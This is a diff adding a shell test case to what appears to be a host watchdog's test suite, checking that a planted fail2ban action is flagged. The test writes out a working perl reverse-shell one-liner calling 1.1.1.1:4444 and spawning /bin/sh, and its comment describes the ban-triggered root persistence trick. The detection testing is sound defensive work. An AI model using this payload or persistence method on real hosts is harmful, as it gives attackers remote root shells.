@@ -280,3 +280,20 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on fail2ban action surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp fail2ban-
+    # action rev-shell variants already locked. Perl is on every
+    # Debian/Ubuntu host as dpkg/locale dependency; 'use Socket'
+    # produces a one-liner connect-back PTY just as cleanly as
+    # Python. Locks the perl axis on the T1546 fail2ban-ban-
+    # event-trigger root-exec persistence surface — attacker
+    # self-induces ban (fail SSH N times from throwaway IP) to
+    # fire the planted perl rev-shell.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Definition]\nactionban = perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
